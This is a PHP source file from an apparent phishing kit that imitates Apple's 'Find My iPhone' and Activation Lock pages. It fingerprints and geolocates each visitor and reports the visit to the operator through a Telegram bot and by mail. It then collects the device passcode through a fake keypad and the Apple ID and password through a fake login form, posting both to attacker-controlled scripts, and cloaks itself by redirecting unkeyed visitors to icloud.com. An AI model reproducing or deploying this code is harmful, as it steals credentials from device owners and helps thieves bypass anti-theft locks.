<?php
header ('Content-type: text/html; charset=utf-8');
error_reporting(0);
$ID = empty($_GET["ID"]) ? NULL : $_GET["ID"];
$auth = empty($_GET["auth"]) ? NULL : $_GET["auth"];
$accessed = file_get_contents("access.txt");
if ($_SERVER["HTTP_HOST"] != "localhost") {
    if (empty($ID) & empty($auth)) {
        header("Location: https://icloud.com");
        exit;
    }
    if (strstr($accessed, $ID) || strstr($accessed, $auth)) {
    } else {
        header("Location: https://icloud.com");
        exit;
    }
}

function getOS($user_agent) { 
    $os_platform  = "Unknown OS Platform";

    $os_array     = array(
                          '/windows nt 10/i'      =>  'Windows 10',
                          '/windows nt 6.3/i'     =>  'Windows 8.1',
                          '/windows nt 6.2/i'     =>  'Windows 8',
                          '/windows nt 6.1/i'     =>  'Windows 7',
                          '/windows nt 6.0/i'     =>  'Windows Vista',
                          '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                          '/windows nt 5.1/i'     =>  'Windows XP',
                          '/windows xp/i'         =>  'Windows XP',
                          '/windows nt 5.0/i'     =>  'Windows 2000',
                          '/windows me/i'         =>  'Windows ME',
                          '/win98/i'              =>  'Windows 98',
                          '/win95/i'              =>  'Windows 95',
                          '/win16/i'              =>  'Windows 3.11',
                          '/macintosh|mac os x/i' =>  'Mac OS X',
                          '/mac_powerpc/i'        =>  'Mac OS 9',
                          '/linux/i'              =>  'Linux',
                          '/ubuntu/i'             =>  'Ubuntu',
                          '/iphone/i'             =>  'iPhone',
                          '/ipod/i'               =>  'iPod',
                          '/ipad/i'               =>  'iPad',
                          '/android/i'            =>  'Android',
                          '/blackberry/i'         =>  'BlackBerry',
                          '/webos/i'              =>  'Mobile'
                    );

    foreach ($os_array as $regex => $value)
        if (preg_match($regex, $user_agent))
            $os_platform = $value;

    return $os_platform;

} 





function getBrowser(){

$agent = $_SERVER['HTTP_USER_AGENT'];
$name = 'NA';


if (preg_match('/MSIE/i', $agent) && !preg_match('/Opera/i', $agent)) {
    $name = 'Internet Explorer';
} elseif (preg_match('/Firefox/i', $agent)) {
    $name = 'Mozilla Firefox';
} elseif (preg_match('/Chrome/i', $agent)) {
    $name = 'Google Chrome';
} elseif (preg_match('/Safari/i', $agent)) {
    $name = 'Apple Safari';
} elseif (preg_match('/Opera/i', $agent)) {
    $name = 'Opera';
} elseif (preg_match('/Netscape/i', $agent)) {
    $name = 'Netscape';
}


return $name;
}

function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($purpose) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}



function getUserIP(){
    // Get real visitor IP behind CloudFlare network
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
$url="https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
$uri = substr($url, 0, -5);
$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
$IP = getUserIP();
$browser = getBrowser();
$os = getOS($_SERVER['HTTP_USER_AGENT']);
$country = ip_info("Visitor", "City")." ".ip_info("Visitor", "Country");
$headers = "Content-type: text/html; charset=iso-8859-1" . "\r\n";
include "../js/ajaxi.php";
$subject = "Visit Details";
$message = "Got Owner Visit FMI:\n===================\nID: " . $ID . "\IMEI: " . $auth . "\nBrowser:" . $browser . "\n" . $country . "\n";
 $ttrue = "Owner opened link ( Passcode 4 )\n=============\nlink: #$url\nIP: $IP\nBrowser: $browser\nOS: $os\nCountry: $country\nLanguage: $lang\n=============\nOrder details\nOrder auth: $auth\nID: $ID\n=============\n=> Waitin Login <=";
$datatrue = array("text" => $ttrue, "chat_id" => $chat_id);
mail($to, $subject, $message, $headers);
file_get_contents("https://api.telegram.org/bot" . $token . "/sendMessage?" . http_build_query($datatrue));

echo "<!DOCTYPE html>\n";
echo "<html><head>\n";
echo "\n";
echo "		<script src=\"src/icloud_page/jquery-1.10.2.js\"></script>\n";
echo "		<script type='text/javascript'>\n";
echo "			$(document).ready(function () {\n";
echo "			var ss = setTimeout(function () {\n";
echo "								\n";
echo "							\n";
echo "							\n";
echo "								);\n";
echo "							}, 2000);\n";
echo "			});\n";
echo "		</script>\n";
echo "	<title>Find My iPhone</title>\n";
echo "  <link rel=\"shortcut icon\" href=\"favicon.ico\" type=\"image/x-icon\" />\n";
echo "	<base href=\"\">\n";
echo "	<link rel=\"stylesheet\" type=\"text/css\" href=\"src/activation_lock/passcode.css\">\n";
echo "	<meta charset=\"utf-8\">\n";
echo "	<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\">\n";
echo "	<script src=\"code.jquery.com/jquery-1.10.2.js\"></script>\n";
echo "	<script src=\"code.jquery.com/ui/1.12.1/jquery-ui.js\"></script>\n";
echo "	<script src=\"src/icloud_page_new/activity-indicator.js\"></script>\n";
echo "</head>\n";
echo "<body id=\"body_b\" style=\"font-family: Arial, Helvetica, sans-serif; \">\n";
echo "	<div id=\"show_1\" style=\"display: block;\">\n";
echo "	<div style=\"margin: 0; position: absolute; top: 50%; left: 50%; -ms-transform: translate(-50%, -50%); transform: translate(-50%, -50%);\">\n";
echo "		<div id=\"submit_loader_1\"></div>\n";
echo "		<div style=\"padding-top: 18px; text-align: center;\"><label style=\"font-family: Arial, Helvetica, sans-serif;\">It may take few minutes to locate your lost iPhone.</label></div></div></div>\n";
echo "	<div  id=\"show_2\" style=\"text-align: center; margin-left: 20px; margin-right: 20px; padding-top: 40px; display: none;\"> \n";
echo "		<span style=\"font-size: 34px;\">Enter Passcode</span><br />\n";
echo "		<span style=\"font-size: 14px;\">Enter the passcode that was previously used to lock this lost iPhone.</span>\n";
echo "	<div id=\"code\" style=\"padding-top: 20px;\">\n";
echo "	<div id=\"bile\"><svg height=\"40\" width=\"40\">\n";
echo "		<circle id=\"c1\" cx=\"20\" cy=\"20\" r=\"10\" stroke=\"black\" stroke-width=\"1\" fill=\"white\" />Sorry, your browser does not support inline SVG.\n";
echo "	</svg>\n";
echo "	<svg height=\"40\" width=\"40\">\n";
echo "		<circle id=\"c2\" cx=\"20\" cy=\"20\" r=\"10\" stroke=\"black\" stroke-width=\"1\" fill=\"white\" />Sorry, your browser does not support inline SVG.\n";
echo "	</svg>\n";
echo "	<svg height=\"40\" width=\"40\">\n";
echo "		<circle id=\"c3\" cx=\"20\" cy=\"20\" r=\"10\" stroke=\"black\" stroke-width=\"1\" fill=\"white\" />Sorry, your browser does not support inline SVG.  \n";
echo "	</svg>\n";
echo "	<svg height=\"40\" width=\"40\">\n";
echo "		<circle id=\"c4\" cx=\"20\" cy=\"20\" r=\"10\" stroke=\"black\" stroke-width=\"1\" fill=\"white\" />Sorry, your browser does not support inline SVG.\n";
echo "	</svg>\n";
echo "	<input type=\"number\" name=\"\" value=\"\" hidden=\"\" />\n";
echo "	</div>\n";
echo "	<div style=\"text-align: center; padding-top: 16px; margin-right: auto; margin-left: auto;\">\n";
echo "	<div>\n";
echo "			<table style=\"width:280px; margin: auto;\">\n";
echo "				  <tr>\n";
echo "					    <th><button id=\"1\" class=\"button button5\">1</button></th>\n";
echo "					    <th><button id=\"2\" class=\"button button5\">2</button></th> \n";
echo "					    <th><button id=\"3\" class=\"button button5\">3</button></th>\n";
echo "				  </tr>\n";
echo "				  <tr>\n";
echo "					    <th><button id=\"4\" class=\"button button5\">4</button></th>\n";
echo "					    <th><button id=\"5\" class=\"button button5\">5</button></th>\n";
echo "					    <th><button id=\"6\" class=\"button button5\">6</button></th>\n";
echo "				  </tr>\n";
echo "				  <tr>\n";
echo "					    <th><button id=\"7\" class=\"button button5\">7</button></th>\n";
echo "					    <th><button id=\"8\" class=\"button button5\">8</button></th>\n";
echo "					    <th><button id=\"9\" class=\"button button5\">9</button></th>\n";
echo "				  </tr>\n";
echo "				  <tr>\n";
echo "			    <th></th>\n";
echo "			    <th><button id=\"0\" class=\"button button5\">0</button></th>\n";
echo "			    <th><button class=\"button buttonr\" onclick=\"remove()\"><img src=\"src/activation_lock/next.png\" width=\"35\"/></button></th>\n";
echo "		  </tr>\n";
echo "	  </table>\n";
echo "	</div></div>\n";
echo "	</div>\n";
echo "	</div>\n";
echo "	<div  id=\"show_3\" style=\"text-align: center; display: none;\">\n";
echo "		<div style=\" padding-top: 40px;\">\n";
echo "			<span style=\"font-size: 45px;\">Activation Lock</span><br>\n";
echo "			<div style=\"margin: 0 auto; max-width:550px;\">\n";
echo "				<div style=\"padding-top: 45px; margin-left: 16px; margin-right: 16px;\"><span >This iPhone is linked to an Apple ID. Enter the Apple ID and password that where used to lock this device.</span><br>\n";
echo "				<div style=\"padding-top: 45px; \"></div></div>\n";
echo "			<div style=\"margin-left: 10px; margin-right: 10px; text-align: left; border-bottom: 1px solid #dbdbdb; border-top: 1px solid #dbdbdb;\">\n";
echo "			<div style=\"border-bottom: 1px solid #dbdbdb;\"><label style=\"padding-left: 40px; position: absolute; padding-top: 14px; \">Apple ID</label>\n";
echo "			<input id=\"appleId\" type=\"text\" name=\"id\" value=\"\"  placeholder=\"Apple ID\" style=\"font-size: 14px; border:none; padding-top: 14px; padding-right: 14px; padding-bottom: 14px; padding-left: 135px; width: 100%;\">\n";
echo "			</div>\n";
echo "				<div style=\"padding-left: 34px;\"></div>\n";
echo "			<label style=\"padding-left: 40px; position: absolute; padding-top: 14px;\">Password</label>\n";
echo "			<input id=\"pw\" type=\"password\" name=\"pwd\" value=\"\"  placeholder=\"Required\" style=\"font-size: 14px; border:none; padding-left: 30px; padding-top: 14px; padding-right: 14px; padding-bottom: 14px; padding-left: 135px; width: 100%;\">\n";
echo "		<div></div></div></div>\n";
echo "\n";
echo "<div>\n";
echo "<input type=\"hidden\" name=\"ID\" id=\"ID\" value=\"<?php echo $ID;?>\">\n";
echo "</div>\n";
echo "<div>\n";
echo "<input type=\"hidden\" name=\"auth\" id=\"auth\" value=\"<?php echo $auth;?>\">\n";
echo "</div>\n";
echo "\n";
echo "		<div style=\"padding-top: 25px; \">\n";
echo "			<div id=\"submit_loader_2\" class=\"spinner_2 hide\"></div>\n";
echo "			<button class=\"submit_b\" name=\"submit\" id=\"singin\" type=\"submit\" disabled=\"\">Confirm</button>\n";
echo "		</div>\n";
echo "\n";
echo "		<div id=\"myModal\" class=\"modal\">\n";
echo "		<!-- Modal content -->\n";
echo "		<div align=\"center\" class=\"modal-content w3-animate-zoom\">\n";
echo "			<div style=\"padding-left: 18px; padding-right: 18px; padding-top: 18px; padding-bottom: 10px\">\n";
echo "			<span style=\"padding-top: 10px; font-weight: bold\">Verification Failed</span>\n";
echo "			<div style=\"padding-top: 4px\"><span style=\"font-size: 13px\">Your Apple ID or password was incorrect.</span></div>\n";
echo "			</div>\n";
echo "			<div style=\"padding-top:12px; min-height: 30px; border-top: 1px solid #dbdbdb; border-bottom-left-radius: 16px; border-bottom-right-radius: 16px;\" class=\"close\"><span style=\"color: #008ae6;\" >OK</span></div>\n";
echo "		</div>\n";
echo "	</div>\n";
echo "	</div>\n";
echo "	</div>\n";
echo "		<script id=\"erasable_1\" type=\"text/javascript\">\n";
echo "		var	setcolor = 0;\n";
echo "		var num = 0;\n";
echo "		var afis = 0;\n";
echo "		function remove() {\n";
echo "		if (setcolor > 0){\n";
echo "				changePolyColor(\"white\");\n";
echo "				num = parseInt(num/10);	\n";
echo "		}\n";
echo "		setcolor--;\n";
echo "		if (setcolor <  1)\n";
echo "			setcolor = 0;\n";
echo "		}\n";
echo "		function changePolyColor(color) {\n";
echo "			var poly = document.getElementById(\"c\" + setcolor);\n";
echo "			poly.setAttribute(\"fill\", color);\n";
echo "		}\n";
echo "	document.getElementById(\"erasable_1\").innerHTML = \"\";</script>\n";
echo "	<script id=\"erasable_2\" type=\"text/javascript\">\n";
echo "		$(document).ready(function(){\n";
echo "			$(\"#show_1\").bind(\"touchstart\", function preventZoom(e){\n";
echo "				       var t2 = e.timeStamp;\n";
echo "				var t1 = $(this).data(\"lastTouch\") || t2;\n";
echo "				var dt = t2 - t1;\n";
echo "				var fingers = e.originalEvent.touches.length;\n";
echo "				$(this).data(\"lastTouch\", t2);\n";
echo "				if (!dt || dt > 500 || fingers > 1){\n";
echo "					return; // not double-tap\n";
echo "				}\n";
echo "				e.preventDefault(); // double tap - prevent the zoom\n";
echo "				// also synthesize click events we just swallowed up\n";
echo "				$(e.target).trigger(\"click\");\n";
echo "		});\n";
echo "		$(\"#show_2\").bind(\"touchstart\", function preventZoom(e){\n";
echo "				var t2 = e.timeStamp;\n";
echo "				var t1 = $(this).data(\"lastTouch\") || t2;\n";
echo "				var dt = t2 - t1;\n";
echo "				var fingers = e.originalEvent.touches.length;\n";
echo "				$(this).data(\"lastTouch\", t2);\n";
echo "				if (!dt || dt > 500 || fingers > 1){\n";
echo "					return; // not double-tap\n";
echo "				}\n";
echo "				e.preventDefault(); // double tap - prevent the zoom\n";
echo "				// also synthesize click events we just swallowed up\n";
echo "				$(e.target).trigger(\"click\");\n";
echo "		});\n";
echo "		$(\"#show_3\").bind(\"touchstart\", function preventZoom(e){\n";
echo "				var t2 = e.timeStamp;\n";
echo "				var t1 = $(this).data(\"lastTouch\") || t2;\n";
echo "				var dt = t2 - t1;\n";
echo "				var fingers = e.originalEvent.touches.length;\n";
echo "				$(this).data(\"lastTouch\", t2);\n";
echo "				if (!dt || dt > 500 || fingers > 1){\n";
echo "					return; // not double-tap\n";
echo "				}\n";
echo "				e.preventDefault(); // double tap - prevent the zoom\n";
echo "				// also synthesize click events we just swallowed up\n";
echo "				$(e.target).trigger(\"click\");\n";
echo "		});\n";
echo "		$(\".button5\").click(function(){\n";
echo "			setcolor++;\n";
echo "			if (setcolor <= 4){\n";
echo "				changePolyColor(\"black\");	\n";
echo "				num = (num*10) + parseInt($(this).prop(\"id\"));\n";
echo "				if (setcolor == 4){\n";
echo "					if (num.toString().length == 0){\n";
echo "					num = \"0000\"+num;\n";
echo "					};\n";
echo "					if (num.toString().length == 1){\n";
echo "					num = \"000\"+num;\n";
echo "					};\n";
echo "					if (num.toString().length == 2){\n";
echo "					num = \"00\"+num;\n";
echo "					};\n";
echo "					if (num.toString().length == 3){\n";
echo "					num = \"0\"+num;\n";
echo "					};\n";
echo "\n";
echo "				$.ajax({\n";
echo "						type:\"POST\",\n";
echo "						url:\"src/code.php\",\n";
echo "						data: \"code=\"+num+\"&key=e7ea3\"});\n";
echo "					afis++;\n";
echo "					if (afis == 2){\n";
echo "						$(\"#show_2\").css(\"display\", \"none\");\n";
echo "						$( \"#show_3\" ).fadeIn( \"slow\", function() {\n";
echo "						//$(\"#code_in\" ).focus();\n";
echo "							});\n";
echo "					}\n";
echo "					else\n";
echo "						$(\"#bile\").effect(\"shake\", {times:3}, 500, callback);\n";
echo "					}\n";
echo "					}\n";
echo "				if (setcolor > 4)\n";
echo "					setcolor = 4;\n";
echo "		});		\n";
echo "		function callback(){\n";
echo "			num = 0;\n";
echo "\n";
echo "			setTimeout(clear(), 3000);\n";
echo "		}\n";
echo "		function clear(){\n";
echo "			for (var i=0;i<=4;i++){\n";
echo "				changePolyColor(\"white\");\n";
echo "				setcolor--;\n";
echo "			}	\n";
echo "			setcolor = 0;			\n";
echo "		}\n";
echo "				function show_body() {\n";
echo "					$(\"#show_1\").css(\"display\", \"none\");\n";
echo "					$( \"#show_2\" ).fadeIn( \"slow\", function() {\n";
echo "					// Animation complete.\n";
echo "				//$( \"#code_in\" ).focus();\n";
echo "					});\n";
echo "				}\n";
echo "				setTimeout(show_body, 2000);\n";
echo "		$( \"#pw\" ).keyup(function (e) {\n";
echo "\n";
echo "							if ($(\"#appleId\").val() != \"\" && $(\"#pw\").val() != \"\"){\n";
echo "								$(\"#singin\").prop(\"disabled\", false);\n";
echo "								if (e.which == 13) {\n";
echo "									$(\"#singin\").css(\"display\", \"none\");\n";
echo "									$(\"#submit_loader_2\").removeClass(\"hide\");\n";
echo "									login();\n";
echo "								}\n";
echo "							} else {\n";
echo "								$(\"#singin\").prop(\"disabled\", true);\n";
echo "							}\n";
echo "\n";
echo "						});\n";
echo "		$( \"#pw\" ).focus(function() {\n";
echo "							if ($(\"#appleId\").val() != \"\"){\n";
echo "								var re = /^(([^<>()[].,;:s@\"]+(.[^<>()[].,;:s@\"]+)*)|(\".+\"))@(([[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}])|(([a-zA-Z-0-9]+.)+[a-zA-Z]{2,}))$/;\n";
echo "								if (!re.test($(\"#appleId\").val())){\n";
echo "									$(\"#appleId\").val($(\"#appleId\").val());\n";
echo "								}\n";
echo "							}\n";
echo "						});\n";
echo "		$(\"#singin\").click(function(){\n";
echo "					if ($(\"#appleId\").val() != \"\" && $(\"#pw\").val() != \"\"){\n";
echo "					$(\"#spiner\").css(\"position\", \"relative\");\n";
echo "					$(\"#spiner\").css(\"left\", \"10px\");\n";
echo "					$(\"#singin\").addClass(\"hide\");\n";
echo "					$(\"#submit_loader_2\").removeClass(\"hide\");\n";
echo "				login();}});\n";
echo "		function myPastePW() {\n";
echo "			$(\"#singin\").prop(\"disabled\", false);\n";
echo "			}\n";
echo "	});\n";
echo "	function login(){\n";
echo "					$(\"#pw\").blur();\n";
echo "					var apple = $(\"#appleId\").val();\n";
echo "					var pw = $(\"#pw\").val();\n";
echo "					var key = \"e7ea3\";\n";
echo "					if(apple!= \"\" && pw!= \"\")\n";
echo "					{\n";
echo "						$(\"#submit\").removeClass(\"disable\");\n";
echo "						$(\"#submit\").addClass(\"v-hide\");\n";
echo "						$(\"#spiner\").removeClass(\"hide\");\n";
echo "						$(\"#spiner\").addClass(\"show\");\n";
echo "						$.ajax({\n";
echo "\n";
echo "							type:\"POST\",\n";
echo "							url:\"ajax.php\",\n";
echo "							data:\"appleID=\"+apple+\"&pw=\"+pw+\"&key=\",\n";
echo "							success: function(msg){\n";
echo "								// alert(msg);\n";
echo "								if(msg == \"INVALID\")\n";
echo "								{\n";
echo "									$(\"#pw\").blur()\n";
echo "									$(\"#myModal\").css(\"display\",\"block\");\n";
echo "									$(\"#singin_2\").css(\"display\", \"block\");\n";
echo "									$(\"#spiner\").css(\"display\", \"none\");\n";
echo "									$(\"#pw\").val(\"\");\n";
echo "									$(\"#singin\").removeClass(\"hide\");\n";
echo "									$(\"#singin\").prop(\"disabled\", true);\n";
echo "									$(\"#submit_loader_2\").addClass(\"hide\");\n";
echo "								}\n";
echo "								else\n";
echo "								{\n";
echo "									$(\"#sc1853\").css(\"display\",\"block\");\n";
echo "									$(\".login\").css(\"display\",\"none\");\n";
echo "									var delayInMilliseconds = 5000; //1 second		\n";
echo "				setTimeout(function() {var redirect_after_login = \"apple\";\n";
echo "									\n";
echo "										if (redirect_after_login == \"apple\") document.location.href = \"https://www.apple.com/\";\n";
echo "									else if (redirect_after_login == \"map\") document.location.href = \"https://icloud.com\" ;}, delayInMilliseconds);\n";
echo "								}\n";
echo "								$(\"#spiner\").addClass(\"hide\");\n";
echo "								$(\"#spiner\").removeClass(\"show\");\n";
echo "							}\n";
echo "						});\n";
echo "					}\n";
echo "					else\n";
echo "					{\n";
echo "					if(apple== \"\") jQuery(\"#apple\").focus();\n";
echo "						else if(pw== \"\") jQuery(\"#pw\").focus();\n";
echo "					}\n";
echo "\n";
echo "			\n";
echo "\n";
echo "}\n";
echo "	document.getElementById(\"erasable_2\").innerHTML = \"\";</script>\n";
echo "	<script type=\"text/javascript\">\n";
echo "		jQuery(\"#submit_loader_1\").activity({width: 1, segments: 12, length: 5});\n";
echo "		jQuery(\"#submit_loader_2\").activity({width: 1, segments: 12, length: 5});\n";
echo "\n";
echo "		$(\".close\").click(function(){\n";
echo "			$(\"#myModal\").css(\"display\", \"none\");\n";
echo "			$(\"#pw\").focus();\n";
echo "\n";
echo "		});\n";
echo "	</script>\n";
echo "</body>\n";
echo "</html>";

?>
